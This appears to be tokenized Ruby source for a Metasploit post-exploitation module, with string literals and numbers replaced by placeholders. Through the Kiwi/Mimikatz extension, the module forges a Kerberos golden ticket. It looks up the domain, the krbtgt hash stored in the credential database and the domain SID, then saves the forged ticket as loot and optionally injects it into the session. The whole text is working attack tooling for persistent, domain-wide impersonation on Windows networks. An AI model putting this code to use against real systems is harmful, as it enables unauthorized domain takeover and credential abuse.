require <str> require <str> require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: Windows :: NetAPI include Msf :: Post :: Windows :: Accounts include Msf :: Post :: Windows :: Kiwi include Msf :: Post :: Windows :: Error def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] ] ) ) register_options ( [ OptBool . new ( <str> , [ true , <str> , false ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptInt . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) ] , self . class ) end def run return unless load_kiwi user = datastore [ <str> ] domain = datastore [ <str> ] krbtgt_hash = datastore [ <str> ] domain_sid = datastore [ <str> ] id = datastore [ <str> ] || <int> groups = [ ] groups = datastore [ <str> ] . split ( <str> ) . map ( & <str> ) if datastore [ <str> ] unless domain print_status ( <str> ) domain = get_domain if domain print_good ( <str> domain <str> ) else fail_with ( Failure :: Unknown , <str> ) end end unless krbtgt_hash if framework . db . active print_status ( <str> ) krbtgt_hash = lookup_krbtgt_hash ( domain ) fail_with ( Failure :: Unknown , <str> ) unless krbtgt_hash else fail_with ( Failure :: BadConfig , <str> ) end end unless domain_sid print_status ( <str> domain <str> ) domain_sid = lookup_domain_sid ( domain ) if domain_sid print_good ( <str> domain <str> domain_sid <str> ) else fail_with ( Failure :: Unknown , <str> domain <str> ) end end unless user if id && id != <int> print_status ( <str> id <str> ) user = resolve_sid ( <str> domain_sid <str> id <str> ) [ <str> ] else print_status ( <str> ) user = resolve_sid ( <str> domain_sid <str> ) [ <str> ] end if user print_good ( <str> user <str> ) else fail_with ( Failure :: Unknown , <str> ) end end print_status ( <str> domain <str> user <str> ) ticket = client . kiwi . golden_ticket_create ( user , domain , domain_sid , krbtgt_hash , id , groups ) if ticket print_good ( <str> ) ticket_location = store_loot ( <str> , <str> , session , ticket , <str> domain <str> user <str> , <str> domain <str> user <str> ) print_status ( <str> ticket_location <str> ) if datastore [ <str> ] print_status ( <str> ) client . kiwi . kerberos_ticket_use ( ticket ) print_good ( <str> ) end else fail_with ( Failure :: Unknown , <str> ) end end def lookup_domain_sid ( domain ) string_sid = nil cb_sid = sid_buffer = <int> cch_referenced_domain_name = referenced_domain_name_buffer = <int> res = client . railgun . advapi32 . LookupAccountNameA ( nil , domain , sid_buffer , cb_sid , referenced_domain_name_buffer , cch_referenced_domain_name , <int> ) if ! res [ <str> ] && res [ <str> ] == INSUFFICIENT_BUFFER sid_buffer = cb_sid = res [ <str> ] referenced_domain_name_buffer = cch_referenced_domain_name = res [ <str> ] res = client . railgun . advapi32 . LookupAccountNameA ( nil , domain , sid_buffer , cb_sid , referenced_domain_name_buffer , cch_referenced_domain_name , <int> ) elsif ! res [ <str> ] return nil end if res [ <str> ] sub_authority_count = res [ <str> ] . unpack ( <str> ) [ <int> ] sid = res [ <str> ] . unpack ( <str> sub_authority_count <str> ) string_sid = <str> sid [ <int> ] <str> sid [ <int> ] <str> sid [ <int> ] <str> sid [ <int> ] <str> sid [ <int> ] <str> sid [ <int> ] <str> else print_error ( <str> res [ <str> ] <str> ) end string_sid end def lookup_krbtgt_hash ( domain ) krbtgt_hash = nil krbtgt_creds = Metasploit :: Credential :: Core . joins ( <str> , <str> ) . where ( <str> : { <str> : <str> } , <str> : { <str> : <str> } , <str> : myworkspace . id ) if krbtgt_creds if krbtgt_creds . count == <int> print_error ( <str> ) elsif krbtgt_creds . count > <int> krbtgt_creds_realm = krbtgt_creds . select { | c | c . realm . to_s . upcase == domain . upcase } if krbtgt_creds_realm . length == <int> cred = krbtgt_creds_realm . first krbtgt_hash = cred . private . data . split ( <str> ) [ <int> ] print_good ( <str> cred . realm <str> cred . public . username <str> krbtgt_hash <str> ) return krbtgt_hash elsif krbtgt_creds_realm . length > <int> krbtgt_creds = krbtgt_creds_realm end print_error ( <str> ) krbtgt_creds . each do | kc | hash = kc . private . data . split ( <str> ) [ <int> ] print_line ( <str> kc . realm <str> kc . public . username <str> hash <str> ) end else cred = krbtgt_creds . first krbtgt_hash = cred . private . data . split ( <str> ) [ <int> ] print_good ( <str> cred . realm <str> cred . public . username <str> krbtgt_hash <str> ) end end krbtgt_hash end end 
